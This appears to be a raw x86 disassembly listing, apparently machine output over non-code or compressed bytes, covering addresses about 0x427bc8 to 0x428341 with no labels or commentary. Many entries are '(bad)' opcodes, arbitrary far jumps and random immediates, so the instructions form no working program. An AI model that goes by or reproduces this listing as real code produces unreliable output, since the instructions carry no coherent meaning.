  427bc8:	mov    ah,0xb3
  427bca:	jp     0x427b59
  427bcc:	ror    bl,1
  427bce:	jns    0x427be0
  427bd0:	push   edi
  427bd1:	xchg   edi,eax
  427bd2:	cs adc al,0x0
  427bd5:	add    BYTE PTR [eax],al
  427bd7:	add    BYTE PTR [eax],al
  427bd9:	push   0x56ffd146
  427bde:	xchg   edi,eax
  427bdf:	sbb    BYTE PTR cs:[eax+0x56],ah
  427be3:	sar    edi,1
  427be5:	ret    0x42f8
  427be8:	das    
  427be9:	push   eax
  427bea:	cwde   
  427beb:	dec    ebx
  427bec:	mov    esp,esp
  427bee:	mov    bh,0x3a
  427bf0:	mov    esp,ecx
  427bf2:	scas   eax,DWORD PTR es:[edi]
  427bf3:	test   DWORD PTR cs:[edi],edi
  427bf6:	fsubr  QWORD PTR [eax+ebp*1-0x6f]
  427bfa:	retf   
  427bfb:	adc    BYTE PTR [edi+0x1070485e],al
  427c01:	sbb    DWORD PTR [edi],edx
  427c03:	or     eax,0x13831314
  427c08:	jne    0x427c60
  427c0a:	mov    dl,0xff
  427c0c:	pop    ecx
  427c0d:	or     bh,BYTE PTR [ebp-0x4c6f55f5]
  427c13:	test   DWORD PTR [ebx],0xbf34a084
  427c19:	mov    bl,0x9a
  427c1b:	out    0x85,eax
  427c1d:	push   eax
  427c1e:	mov    dl,0x34
  427c20:	mov    edi,0x860f9eb3
  427c25:	push   eax
  427c26:	mov    dl,0x10
  427c28:	adc    edx,ebx
  427c2a:	jne    0x427c47
  427c2c:	sbb    al,0xb8
  427c2e:	cs aaa 
  427c30:	add    al,0xd3
  427c32:	jne    0x427c4f
  427c34:	sbb    al,al
  427c36:	cs aaa 
  427c38:	add    al,0xf
  427c3a:	outs   dx,BYTE PTR ds:[esi]
  427c3b:	sbb    edx,DWORD PTR [eax]
  427c3d:	add    BYTE PTR [eax],al
  427c3f:	add    BYTE PTR [eax],al
  427c41:	add    BYTE PTR [edi],dl
  427c43:	adc    bp,WORD PTR [edi+esi*2]
  427c47:	les    ebp,FWORD PTR [ebp-0x10]
  427c4a:	jae    0x427be2
  427c4c:	rol    BYTE PTR [eax],1
  427c4e:	cmovbe ebx,ebx
  427c51:	pop    ds
  427c52:	adc    eax,0xf2802ea
  427c57:	lock iret 
  427c59:	inc    ecx
  427c5a:	(bad)  
  427c5b:	mov    edx,0xca96edf5
  427c60:	pusha  
  427c61:	jbe    0x427cce
  427c63:	mov    esp,0xb291054d
  427c68:	mul    DWORD PTR [edx]
  427c6a:	push   ecx
  427c6b:	js     0x427c23
  427c6d:	icebp  
  427c6e:	xchg   BYTE PTR [eax+0x17],cl
  427c71:	fcom   QWORD PTR [esi]
  427c73:	loopne 0x427c49
  427c75:	mov    esp,cs
  427c77:	pop    ebp
  427c78:	test   DWORD PTR [esp+eiz*8+0x66d0f96],0x1703f7b3
  427c83:	ja     0x427c98
  427c85:	adc    al,0xf8
  427c87:	xchg   edx,eax
  427c88:	push   cs
  427c89:	mov    ebp,0xb4c93563
  427c8e:	pop    ss
  427c8f:	xor    dh,cl
  427c91:	mov    al,ds:0x1f44cabb
  427c96:	jg     0x427c4f
  427c98:	and    BYTE PTR [ebx],bh
  427c9a:	jmp    0xc035:0x7d1647b6
  427ca1:	jl     0x427c2e
  427ca3:	push   esp
  427ca4:	pop    ss
  427ca5:	mov    ds:0x0,eax
  427caa:	add    BYTE PTR [edx+0x6649f5e9],ah
  427cb0:	mov    bh,0xec
  427cb2:	fisub  WORD PTR ds:0x536a73f3
  427cb8:	xor    BYTE PTR [eax+esi*2+0x7],0x5f
  427cbd:	push   cs
  427cbe:	ret    0x34cd
  427cc1:	bound  edx,QWORD PTR [ebp+0x2314549b]
  427cc7:	mov    edx,0x1d68469f
  427ccc:	ret    0x299a
  427ccf:	xchg   esp,eax
  427cd0:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  427cd1:	push   edx
  427cd2:	cdq    
  427cd3:	leave  
  427cd4:	mov    edi,ss
  427cd6:	xchg   ecx,eax
  427cd7:	jle    0x427c92
  427cd9:	in     al,dx
  427cda:	sahf   
  427cdb:	gs test al,0xac
  427cde:	in     eax,dx
  427cdf:	ret    
  427ce0:	push   eax
  427ce1:	xchg   edi,eax
  427ce2:	and    eax,0x2d97bb59
  427ce7:	mov    al,0xa2
  427ce9:	mov    dh,0xe8
  427ceb:	pusha  
  427cec:	cwde   
  427ced:	mov    dh,0xeb
  427cef:	outs   dx,DWORD PTR ds:[esi]
  427cf0:	test   eax,0xb5679293
  427cf5:	js     0x427d00
  427cf7:	ins    DWORD PTR es:[edi],dx
  427cf8:	push   ecx
  427cf9:	daa    
  427cfa:	lods   eax,DWORD PTR ds:[esi]
  427cfb:	push   0xebe461b9
  427d00:	test   eax,0xceabfa62
  427d05:	jmp    0xdd01:0xb644d600
  427d0c:	test   al,0xa6
  427d0e:	loopne 0x427d10
  427d10:	add    BYTE PTR [eax],al
  427d12:	add    BYTE PTR [eax],al
  427d14:	scas   ax,WORD PTR es:[edi]
  427d16:	push   cs
  427d17:	data16 sub bl,bh
  427d1a:	dec    ecx
  427d1b:	add    BYTE PTR [edx-0x7dd7cf15],al
  427d21:	sti    
  427d22:	xor    BYTE PTR [edx+esi*2],ah
  427d25:	repz xor BYTE PTR [edx+ebp*1],dl
  427d29:	out    dx,eax
  427d2a:	xchg   ebp,eax
  427d2b:	inc    esp
  427d2c:	fstp   QWORD PTR [edx+0x30f6df25]
  427d32:	out    dx,eax
  427d33:	(bad)  
  427d34:	out    0x44,al
  427d36:	xchg   ebp,eax
  427d37:	inc    esp
  427d38:	int    0x9e
  427d3a:	inc    ebp
  427d3b:	test   al,0xc9
  427d3d:	retf   0x8504
  427d40:	out    0xc1,al
  427d42:	add    BYTE PTR [ebp+0x20744474],cl
  427d48:	push   esp
  427d49:	stos   BYTE PTR es:[edi],al
  427d4a:	addr16 pop edx
  427d4c:	pop    edi
  427d4d:	ja     0x427d4e
  427d4f:	je     0x427d00
  427d51:	xor    edi,esi
  427d53:	add    dh,BYTE PTR [esi-0x35]
  427d56:	loope  0x427d8b
  427d58:	lock fist DWORD PTR [ebp-0x49514bb4]
  427d5f:	push   es
  427d60:	popf   
  427d61:	test   eax,0xaeacb719
  427d66:	ins    DWORD PTR es:[edi],dx
  427d67:	clc    
  427d68:	mov    ah,al
  427d6a:	sbb    BYTE PTR [ebx+0x75fbd11],al
  427d70:	cli    
  427d71:	outs   dx,BYTE PTR ds:[esi]
  427d72:	out    dx,al
  427d73:	data16 lock stc 
  427d76:	in     al,dx
  427d77:	mov    al,BYTE PTR [eax]
  427d79:	add    BYTE PTR [eax],al
  427d7b:	add    BYTE PTR [eax],al
  427d7d:	cs loopne 0x427dc6
  427d80:	pop    ebp
  427d81:	mov    edx,0x49c1fe72
  427d86:	mov    dh,0x6d
  427d88:	in     al,dx
  427d89:	nop
  427d8a:	jecxz  0x427d49
  427d8c:	push   esp
  427d8d:	fiadd  WORD PTR [eax]
  427d8f:	xchg   esp,eax
  427d90:	inc    esp
  427d91:	je     0x427d6e
  427d93:	ror    BYTE PTR [esp+ecx*8+0xb500aaf],0x7b
  427d9b:	cli    
  427d9c:	add    eax,DWORD PTR [esi]
  427d9e:	or     al,0x11
  427da0:	sti    
  427da1:	mov    BYTE PTR [edx-0x22],0x23
  427da5:	mov    ah,0x98
  427da7:	sbb    eax,0x110ba590
  427dac:	jg     0x427da6
  427dae:	retf   0xdfb
  427db1:	sbb    edx,DWORD PTR [eax]
  427db3:	or     eax,0xf8cde10
  427db8:	jne    0x427d43
  427dba:	push   esp
  427dbb:	mul    BYTE PTR [ebx]
  427dbd:	jl     0x427d49
  427dbf:	ja     0x427dbf
  427dc1:	mov    edx,0x6c5c95c9
  427dc6:	mov    bh,0x1d
  427dc8:	in     eax,dx
  427dc9:	adc    eax,0x8371fcef
  427dce:	call   0x7b67553e
  427dd3:	xchg   edi,eax
  427dd4:	dec    esp
  427dd5:	in     eax,0xcb
  427dd7:	popa   
  427dd8:	mov    ah,0x74
  427dda:	dec    edi
  427ddb:	adc    DWORD PTR [eax],eax
  427ddd:	nop
  427dde:	push   esp
  427ddf:	push   eax
  427de0:	rol    DWORD PTR [eax],0x0
  427de3:	add    BYTE PTR [eax],al
  427de5:	add    BYTE PTR [eax-0x45],bh
  427de8:	ror    BYTE PTR [edx],0x3f
  427deb:	or     al,cl
  427ded:	addr16 mov eax,0xe9ffd151
  427df3:	retf   
  427df4:	xchg   ebx,eax
  427df5:	inc    esp
  427df6:	mov    ah,0xf3
  427df8:	imul   BYTE PTR ds:0xe1ee23c0
  427dfe:	nop
  427dff:	retf   
  427e00:	(bad)  
  427e01:	les    esi,FWORD PTR [esi+ecx*2+0x51]
  427e05:	jne    0x427e79
  427e07:	mov    dl,0x62
  427e09:	mov    edi,0x86a79273
  427e0e:	aam    0x8e
  427e10:	jecxz  0x427de5
  427e12:	add    al,0x6e
  427e14:	adc    ebp,DWORD PTR [eax]
  427e16:	sar    BYTE PTR [ecx+0x227d74ec],0xc2
  427e1d:	ret    
  427e1e:	pop    ds
  427e1f:	xor    al,0x1f
  427e21:	add    bl,BYTE PTR [ebp-0x4c108f50]
  427e27:	call   0x8f5f:0xc0b70100
  427e2e:	mov    ah,0x22
  427e30:	test   DWORD PTR [ebx],0x881c4c90
  427e36:	fcmove st,st(1)
  427e38:	push   eax
  427e39:	adc    ch,bl
  427e3b:	mov    eax,0x9f644371
  427e40:	jo     0x427e31
  427e42:	mov    bl,0x96
  427e44:	mov    ah,0x38
  427e46:	mov    DWORD PTR [ebx+0x67],0x37
  427e4d:	add    BYTE PTR [eax],al
  427e4f:	rcr    BYTE PTR [eax+0x2d],1
  427e52:	shl    DWORD PTR [esi+0x35],1
  427e55:	mov    ebx,0xf7a5f5ec
  427e5a:	jle    0x427e2e
  427e5c:	int3   
  427e5d:	test   al,0xda
  427e5f:	push   cs
  427e60:	ret    
  427e61:	out    0x3c,eax
  427e63:	outs   dx,DWORD PTR ds:[esi]
  427e64:	repnz push eax
  427e66:	and    BYTE PTR [edx],dh
  427e68:	sub    esi,DWORD PTR ds:0x3d25e118
  427e6e:	sbb    ah,al
  427e70:	out    dx,eax
  427e71:	xor    al,0x8
  427e73:	xchg   ecx,eax
  427e74:	mov    dl,0xf7
  427e76:	add    edx,DWORD PTR [ebx-0x4f]
  427e79:	pop    es
  427e7a:	adc    al,0xb2
  427e7d:	pop    esi
  427e7e:	ret    0x298f
  427e81:	cmp    eax,0xe690900
  427e86:	(bad)  
  427e88:	popf   
  427e89:	outs   dx,BYTE PTR ds:[esi]
  427e8a:	xlat   BYTE PTR ds:[ebx]
  427e8b:	push   ebx
  427e8c:	mov    eax,0x2f902d8f
  427e91:	aam    0xbf
  427e93:	(bad)  
  427e94:	fs cdq 
  427e96:	pop    eax
  427e97:	aam    0x9e
  427e99:	push   cs
  427e9a:	jmp    0xd944332
  427e9f:	and    al,0xb3
  427ea1:	(bad)  
  427ea2:	out    0x9e,al
  427ea4:	in     al,dx
  427ea5:	cmc    
  427ea6:	scas   al,BYTE PTR es:[edi]
  427ea7:	pop    edx
  427ea8:	mov    dl,0xe
  427eaa:	bound  ebx,QWORD PTR [edx+0x5c]
  427ead:	shr    ch,1
  427eaf:	xchg   ebx,eax
  427eb0:	fs cdq 
  427eb2:	sbb    BYTE PTR [eax],al
  427eb4:	add    BYTE PTR [eax],al
  427eb6:	add    BYTE PTR [eax],al
  427eb8:	pop    ss
  427eb9:	cmp    eax,0xb44ae916
  427ebe:	pop    esi
  427ebf:	pop    edi
  427ec0:	aam    0xb7
  427ec2:	pusha  
  427ec3:	lock bound eax,QWORD PTR [esi+edx*1-0x2]
  427ec8:	js     0x427f1c
  427eca:	add    BYTE PTR [ecx-0x26a3d06d],ch
  427ed0:	imul   edx,DWORD PTR [ecx-0xc6c16db],0x13
  427ed7:	int    0x3e
  427ed9:	jb     0x427ee9
  427edb:	aaa    
  427edc:	dec    edi
  427edd:	addr16 inc esp
  427edf:	bound  esp,QWORD PTR [edi+eax*4]
  427ee2:	leave  
  427ee3:	add    dl,al
  427ee5:	scas   eax,DWORD PTR es:[edi]
  427ee6:	arpl   bx,bx
  427ee8:	(bad)  
  427ee9:	push   0xbcbee878
  427eee:	add    dh,BYTE PTR [ebp+0x700e72a3]
  427ef4:	pop    ecx
  427ef5:	scas   eax,DWORD PTR es:[edi]
  427ef6:	xchg   ebx,eax
  427ef7:	test   eax,0xb21fb887
  427efc:	dec    esi
  427efd:	pop    ecx
  427efe:	cwde   
  427eff:	stos   BYTE PTR es:[edi],al
  427f00:	pop    esi
  427f01:	clc    
  427f02:	nop
  427f03:	add    BYTE PTR [eax+0x3973ecb6],dl
  427f09:	cmp    BYTE PTR [edx+0x24],dl
  427f0c:	gs inc esp
  427f0e:	pop    edi
  427f0f:	or     BYTE PTR [eax+0x44ff18ee],dh
  427f15:	sbb    DWORD PTR ds:0x126d2940,0x0
  427f1c:	add    BYTE PTR [eax],al
  427f1e:	add    BYTE PTR [eax],al
  427f20:	add    dl,bh
  427f22:	jg     0x427ee9
  427f24:	cmp    eax,esp
  427f26:	mov    edx,0x440a0f60
  427f2b:	pop    edi
  427f2c:	or     BYTE PTR [esi-0x66],bl
  427f2f:	add    dl,BYTE PTR [ebx]
  427f31:	jmp    0x450312e8
  427f36:	scas   al,BYTE PTR es:[edi]
  427f37:	sub    eax,0xabe8ba8a
  427f3c:	pcmpgtd mm5,mm6
  427f3f:	add    BYTE PTR [ebx+0x36197a1],al
  427f45:	retf   0xad72
  427f48:	(bad)  
  427f4a:	test   BYTE PTR [ebx+eax*4],0xa9
  427f4e:	pop    edi
  427f4f:	xor    eax,0x93daaac1
  427f54:	in     al,dx
  427f55:	cmp    dl,BYTE PTR [edi+0xa]
  427f58:	push   esi
  427f59:	inc    edx
  427f5a:	inc    ebx
  427f5b:	je     0x427f5e
  427f5d:	sub    al,0xf7
  427f5f:	lock call 0x2ab81c
  427f65:	rcl    DWORD PTR [esi],1
  427f67:	in     eax,0xff
  427f69:	into   
  427f6a:	cmp    dl,BYTE PTR [ebx-0x4]
  427f6d:	sub    al,0xef
  427f6f:	cld    
  427f70:	push   eax
  427f71:	ficomp WORD PTR [esi-0x5146ee9e]
  427f77:	xchg   ebx,eax
  427f78:	shl    BYTE PTR [edx+esi*4+0x4425452f],0x3
  427f80:	in     al,0x90
  427f82:	mov    ecx,0xffd0
  427f87:	add    BYTE PTR [eax],al
  427f89:	add    BYTE PTR [eax],bl
  427f8b:	(bad)  
  427f8c:	bound  esp,QWORD PTR [esi+0x7c]
  427f8f:	and    ebp,DWORD PTR [esi+esi*2]
  427f92:	nop
  427f93:	retf   
  427f94:	imul   ecx,DWORD PTR [ebp+0x6c],0xffffff9c
  427f98:	dec    edx
  427f99:	outs   dx,BYTE PTR ds:[esi]
  427f9a:	inc    esi
  427f9b:	inc    esi
  427f9c:	pop    edi
  427f9d:	test   BYTE PTR [eax-0x28],dl
  427fa0:	and    ah,BYTE PTR [esi-0x78]
  427fa3:	inc    esi
  427fa4:	aad    0xef
  427fa6:	loopne 0x427ff6
  427fa8:	lods   eax,DWORD PTR ds:[esi]
  427fa9:	jecxz  0x427fe3
  427fab:	in     al,dx
  427fac:	data16 cli 
  427fae:	daa    
  427faf:	dec    eax
  427fb0:	push   edx
  427fb1:	je     0x428023
  427fb3:	loope  0x427fc9
  427fb5:	(bad)  
  427fb6:	int    0x7f
  427fb8:	ret    0x5d8c
  427fbb:	outs   dx,DWORD PTR ds:[esi]
  427fbc:	dec    edx
  427fbd:	dec    edx
  427fbe:	dec    BYTE PTR [ebp+0x1fd0845f]
  427fc4:	sqrtps xmm3,XMMWORD PTR [esi+0x4e]
  427fc8:	lods   eax,DWORD PTR ds:[esi]
  427fc9:	jecxz  0x427fc3
  427fcb:	xchg   BYTE PTR [eax-0x6],ch
  427fce:	out    0x47,eax
  427fd0:	push   edx
  427fd1:	jne    0x428051
  427fd3:	and    DWORD PTR ds:0x5e159066,eax
  427fd9:	adc    eax,0xffd0dd30
  427fde:	cmp    ebx,eax
  427fe0:	imul   eax,DWORD PTR [ebp-0x40],0x7b
  427fe4:	ins    DWORD PTR es:[edi],dx
  427fe5:	inc    edx
  427fe6:	test   BYTE PTR [ebx+0x5f],bh
  427fe9:	adc    eax,0xffd0bd4c
  427fee:	add    BYTE PTR [eax],al
  427ff0:	add    BYTE PTR [eax],al
  427ff2:	add    BYTE PTR [edx],dl
  427ff4:	or     BYTE PTR [ecx],bl
  427ff6:	lea    ecx,[ebp-0x11]
  427ff9:	dec    eax
  427ffa:	in     al,dx
  427ffb:	popf   
  427ffc:	std    
  427ffd:	pop    ebp
  427ffe:	pop    edx
  427fff:	pop    ecx
  428000:	or     dl,al
  428002:	push   ecx
  428003:	fbstp  TBYTE PTR [edx-0x3ce8b29f]
  428009:	jle    0x428021
  42800b:	jg     0x427fc2
  42800d:	add    DWORD PTR [eax],0x22
  428010:	repnz pop ebp
  428012:	mov    al,0x6b
  428014:	mov    dl,0xf7
  428016:	add    esp,DWORD PTR [ebx-0x4b]
  428019:	ins    BYTE PTR es:[edi],dx
  42801a:	inc    ebp
  42801b:	or     BYTE PTR [edi+ecx*4+0x7bb54702],bl
  428022:	add    BYTE PTR [edx],al
  428024:	repnz lea edi,[eax+0x3b]
  428028:	sub    BYTE PTR [ebx+0x229a027],dh
  42802e:	rol    BYTE PTR [ecx-0x3584088e],1
  428034:	mov    al,0x5f
  428036:	leave  
  428037:	push   ds
  428038:	mov    bh,0x38
  42803a:	test   BYTE PTR [esi+ecx*4+0x5c1803cb],dl
  428041:	div    bh
  428043:	mov    al,ds:0x8470eb48
  428048:	mov    cs,WORD PTR [edi]
  42804a:	jg     0x42809e
  42804c:	scas   al,BYTE PTR es:[edi]
  42804d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42804e:	jo     0x428013
  428050:	xor    BYTE PTR [ebx],dh
  428052:	(bad)  
  428053:	out    dx,al
  428054:	test   eax,0xc162
  428059:	add    BYTE PTR [eax],al
  42805b:	add    BYTE PTR [ebx-0x248f0a36],dl
  428061:	mov    ah,0x90
  428063:	pop    ss
  428064:	mov    eax,0x900361b1
  428069:	bound  esp,QWORD PTR [edx-0x3a]
  42806c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42806d:	(bad)  
  42806e:	int3   
  42806f:	push   edi
  428070:	aaa    
  428071:	out    dx,al
  428072:	repnz into 
  428074:	dec    ecx
  428075:	pop    ecx
  428076:	mov    ecx,0xb27a7fc
  42807b:	sub    BYTE PTR [ecx+eax*4+0x2b917db7],dl
  428082:	push   cs
  428083:	sub    BYTE PTR [eax+0x10e14f29],bl
  428089:	jne    0x428078
  42808b:	ins    BYTE PTR es:[edi],dx
  42808c:	ror    BYTE PTR [esi+ecx*1+0x41],cl
  428090:	ja     0x428102
  428092:	shl    BYTE PTR [eax+0x55],1
  428095:	test   al,0x99
  428097:	test   al,0xd2
  428099:	scas   al,BYTE PTR es:[edi]
  42809a:	push   cs
  42809b:	jb     0x4280d5
  42809d:	nop
  42809e:	adc    dh,BYTE PTR [edx-0x6e]
  4280a1:	sub    DWORD PTR [edi],ecx
  4280a3:	bound  edx,QWORD PTR [edx-0x50]
  4280a6:	xchg   edi,eax
  4280a7:	sub    BYTE PTR [eax-0x430eafd5],bl
  4280ad:	jno    0x4280c5
  4280af:	sbb    cl,ah
  4280b1:	sub    DWORD PTR [eax],edx
  4280b3:	pusha  
  4280b4:	push   edx
  4280b5:	mov    al,0x97
  4280b7:	stos   DWORD PTR es:[edi],eax
  4280b8:	sub    esi,esi
  4280ba:	adc    ecx,ebp
  4280bc:	scas   al,BYTE PTR es:[edi]
  4280bd:	ds xor dh,cl
  4280c0:	add    BYTE PTR [eax],al
  4280c2:	add    BYTE PTR [eax],al
  4280c4:	add    BYTE PTR [esi+0x7ee1323e],ah
  4280ca:	inc    ecx
  4280cb:	adc    al,BYTE PTR [ecx-0x6d]
  4280ce:	mov    dl,0xe
  4280d0:	jmp    0xba512b26
  4280d5:	jp     0x42812d
  4280d7:	xor    bh,cl
  4280d9:	enter  0x7a2c,0xc5
  4280dd:	out    0x60,eax
  4280df:	adc    DWORD PTR [ebx+eax*8],esp
  4280e2:	sub    al,0xe7
  4280e4:	adc    DWORD PTR [esi+0x17e9ecb3],edi
  4280ea:	repz (bad) 
  4280ec:	in     eax,0x82
  4280ee:	repnz clc 
  4280f0:	or     esp,esi
  4280f2:	mov    eax,0x2ba00561
  4280f7:	and    eax,0xa8fa7d6
  4280fc:	jmp    0xe3bc:0xed6028
  428103:	(bad)  
  428104:	aas    
  428105:	test   eax,0x820cd230
  42810a:	in     al,0x10
  42810c:	jbe    0x428188
  42810e:	ss dec ecx
  428110:	add    al,0x2
  428112:	outs   dx,BYTE PTR ds:[esi]
  428113:	dec    eax
  428114:	pop    edi
  428115:	mov    ah,0xe7
  428117:	stos   BYTE PTR es:[edi],al
  428118:	or     al,0x79
  42811a:	fnstsw WORD PTR [edi]
  42811c:	mov    ecx,DWORD PTR [eax]
  42811e:	cmp    BYTE PTR [eax+0x4],ch
  428121:	push   0xffffffc3
  428123:	xor    BYTE PTR [esi+edi*2],cl
  428126:	push   esi
  428127:	add    eax,DWORD PTR [eax]
  428129:	add    BYTE PTR [eax],al
  42812b:	add    BYTE PTR [eax],al
  42812d:	add    BYTE PTR [ecx],bh
  42812f:	scas   eax,DWORD PTR es:[edi]
  428130:	xchg   edx,eax
  428131:	sar    BYTE PTR [ebx+ebp*4],0x3d
  428135:	shl    dl,0xb7
  428138:	xchg   ebx,eax
  428139:	push   es
  42813a:	sub    ch,ch
  42813c:	adc    BYTE PTR [ecx+0x5e49ab47],cl
  428142:	jnp    0x4280ef
  428144:	push   cs
  428145:	mov    ebp,ebp
  428147:	mov    dl,BYTE PTR [edx]
  428149:	push   esi
  42814a:	(bad)  
  42814b:	aaa    
  42814c:	out    0x3b,eax
  42814e:	ds mov bh,0x5e
  428151:	and    al,0x72
  428153:	hlt    
  428154:	sbb    BYTE PTR [ebp-0xf6cbbe8],cl
  42815a:	sbb    eax,0xdad6dfb7
  42815f:	ds in  eax,dx
  428161:	lock xchg edx,eax
  428163:	mov    cl,0x95
  428165:	lock bound ebx,QWORD PTR [ebp-0x6b]
  428169:	iret   
  42816a:	add    DWORD PTR [esi+0x2ab90022],0x35ac74ce
  428174:	popa   
  428175:	or     BYTE PTR [ecx],bl
  428177:	scas   eax,DWORD PTR es:[edi]
  428178:	dec    ecx
  428179:	pop    esi
  42817a:	jmp    0x428125
  42817c:	push   cs
  42817d:	mov    edx,DWORD PTR [eax+0x6b043685]
  428183:	mov    dl,BYTE PTR [esi]
  428185:	jb     0x42811b
  428187:	mov    bh,0x50
  428189:	out    0x8d,eax
  42818b:	inc    edx
  42818c:	rol    DWORD PTR [ebx],1
  42818e:	inc    eax
  42818f:	fwait
  428190:	dec    esi
  428191:	or     BYTE PTR [eax],al
  428193:	add    BYTE PTR [eax],al
  428195:	add    BYTE PTR [eax],al
  428197:	nop
  428198:	leave  
  428199:	gs icebp 
  42819b:	or     ebp,DWORD PTR [edx-0x644382b8]
  4281a1:	adc    BYTE PTR [edi],ch
  4281a3:	push   eax
  4281a4:	adc    edx,DWORD PTR ds:0x6997ce89
  4281aa:	inc    edx
  4281ab:	mov    cl,bl
  4281ad:	dec    ebp
  4281ae:	dec    edi
  4281af:	mov    esi,0xbbe82424
  4281b4:	fist   WORD PTR [edx]
  4281b6:	call   0xfbbcb02c
  4281bb:	or     dh,ah
  4281bd:	xchg   esi,eax
  4281be:	xlat   BYTE PTR ds:[ebx]
  4281bf:	mov    esp,0xbdae4abf
  4281c4:	or     BYTE PTR [edx-0x7b],bh
  4281c7:	push   eax
  4281c8:	mov    ch,ch
  4281ca:	cli    
  4281cb:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4281cc:	mov    edi,0x8648870e
  4281d1:	adc    al,ch
  4281d3:	shr    BYTE PTR [ebx+edx*1],cl
  4281d6:	add    al,bh
  4281d8:	loopne 0x428194
  4281da:	sti    
  4281db:	call   FWORD PTR [esi]
  4281dd:	push   ebx
  4281de:	je     0x428165
  4281e0:	inc    ebp
  4281e1:	adc    bl,bh
  4281e3:	fs jg  0x4281e6
  4281e6:	xchg   eax,ebx
  4281e8:	mov    bl,0x25
  4281ea:	mov    dl,0xdf
  4281ec:	mov    eax,0x9fac7479
  4281f1:	jnp    0x4281c5
  4281f3:	sbb    ebp,DWORD PTR [esp+edx*4+0x48963cd7]
  4281fa:	add    BYTE PTR fs:[eax],al
  4281fd:	add    BYTE PTR [eax],al
  4281ff:	add    BYTE PTR [ebp+0xf6cf4b2],ch
  428205:	jns    0x428233
  428207:	leave  
  428208:	in     eax,dx
  428209:	mov    dh,0xf5
  42820b:	(bad)  
  42820c:	push   cs
  42820d:	lahf   
  42820e:	sub    esi,edx
  428210:	push   ss
  428211:	call   0xb296620b
  428216:	mov    ebp,0xa5b17c44
  42821b:	ins    BYTE PTR es:[edi],dx
  42821c:	std    
  42821d:	(bad)  
  42821e:	outs   dx,DWORD PTR ds:[esi]
  42821f:	dec    ebx
  428220:	jnp    0x428249
  428222:	out    0x6c,al
  428224:	std    
  428225:	mov    esi,0xb197f68c
  42822a:	lods   al,BYTE PTR ds:[esi]
  42822b:	js     0x42828d
  42822d:	mov    eax,ss:0x6c37b5f7
  428233:	in     eax,dx
  428234:	mov    al,0xa8
  428236:	xor    ebx,DWORD PTR [eax]
  428238:	dec    esi
  428239:	rcr    DWORD PTR es:[ebx-0xf],0x69
  42823e:	jge    0x4282ac
  428240:	adc    eax,0xe211ca72
  428245:	mov    cl,0xc3
  428247:	call   DWORD PTR [esi]
  428249:	jp     0x42821b
  42824b:	add    ebp,DWORD PTR [ebx]
  42824d:	daa    
  42824e:	out    dx,al
  42824f:	fstp   DWORD PTR [edi]
  428251:	cdq    
  428252:	jg     0x42820b
  428254:	sbb    esi,DWORD PTR [ecx-0x4f0301c2]
  42825a:	and    eax,0x810fd278
  42825f:	into   
  428260:	cmp    eax,0xd2f5c2
  428265:	add    BYTE PTR [eax],al
  428267:	add    BYTE PTR [eax],al
  428269:	pusha  
  42826a:	push   ebx
  42826b:	(bad)  
  42826d:	push   ebx
  42826e:	mov    dl,0xa8
  428270:	(bad)  
  428271:	inc    ecx
  428272:	or     DWORD PTR [edi-0x39],ebp
  428275:	mov    bl,0xc6
  428277:	std    
  428278:	xlat   BYTE PTR ds:[ebx]
  428279:	jmp    0x42822b
  42827b:	in     eax,dx
  42827c:	jp     0x4282d2
  42827e:	(bad)  
  42827f:	push   cs
  428280:	fimul  DWORD PTR [edi]
  428282:	jb     0x4282a0
  428284:	gs lock mov cl,0xe
  428288:	jmp    0xdebe26e8
  42828d:	cmp    edi,DWORD PTR [ecx]
  42828f:	xlat   BYTE PTR ds:[ebx]
  428290:	ins    BYTE PTR es:[edi],dx
  428291:	gs mov ebp,0xb2947592
  428297:	push   cs
  428298:	jb     0x42826a
  42829a:	aam    0x32
  42829c:	jb     0x428316
  42829e:	aam    0x1e
  4282a0:	bound  eax,QWORD PTR [eax+0x58623ad4]
  4282a6:	aam    0x36
  4282a8:	push   0xffffffe4
  4282aa:	mov    cl,0x61
  4282ac:	cmp    al,0x11
  4282ae:	sahf   
  4282af:	arpl   WORD PTR [eax],si
  4282b1:	lahf   
  4282b2:	adc    BYTE PTR [edx+0x25b46097],0xdf
  4282b9:	pusha  
  4282ba:	std    
  4282bb:	xchg   edi,eax
  4282bc:	sbb    eax,0x7691e670
  4282c1:	inc    eax
  4282c2:	add    esp,DWORD PTR [esi]
  4282c4:	push   ss
  4282c5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4282c6:	es pop ebx
  4282c8:	ins    BYTE PTR es:[edi],dx
  4282c9:	(bad)  
  4282ca:	and    eax,0xbb57
  4282cf:	add    BYTE PTR [eax],al
  4282d1:	add    BYTE PTR [ebp-0x53],al
  4282d4:	arpl   WORD PTR ds:0xa1f70070,cx
  4282da:	in     eax,0xb2
  4282dc:	push   cs
  4282dd:	jo     0x42832f
  4282df:	aam    0x1e
  4282e1:	fs push esp
  4282e3:	es pop ds
  4282e5:	(bad)  
  4282e6:	fcom   st(3)
  4282e8:	cs xchg esi,eax
  4282ea:	loopne 0x4282ec
  4282ec:	jns    0x4282d6
  4282ee:	aad    0xad
  4282f0:	pop    esp
  4282f1:	in     al,0x13
  4282f3:	mov    dl,0xe
  4282f5:	jmp    0xc5a62fbd
  4282fa:	mov    ds:0x3c00e49a,eax
  4282ff:	mov    dh,0xe
  428301:	mov    edi,ebp
  428303:	iret   
  428304:	push   ds
  428305:	mov    ebp,esi
  428307:	iret   
  428308:	cs call 0x2ae979
  42830e:	loop   0x428295
  428310:	xchg   ebp,eax
  428311:	pop    esp
  428312:	xchg   ebp,eax
  428313:	loop   0x428308
  428315:	add    al,0x32
  428317:	outs   dx,DWORD PTR ds:[esi]
  428318:	xor    BYTE PTR [edx+ebx*2],ah
  42831b:	das    
  42831c:	dec    ebx
  42831d:	and    al,0x85
  42831f:	cmp    DWORD PTR [esi],0x55
  428322:	test   eax,0x9574e987
  428327:	loop   0x428310
  428329:	push   esp
  42832a:	xchg   ebp,eax
  42832b:	out    0x95,al
  42832d:	inc    esp
  42832e:	inc    ebp
  42832f:	shl    ebx,cl
  428331:	xor    dl,ah
  428333:	ja     0x428365
  428335:	xor    al,0x0
  428337:	add    BYTE PTR [eax],al
  428339:	add    BYTE PTR [eax],al
  42833b:	repnz xchg edi,eax
  42833d:	xor    BYTE PTR [eax],dh
  42833f:	repnz lahf 
  428341:	xor    BYTE PTR [edx+eiz*8],ch
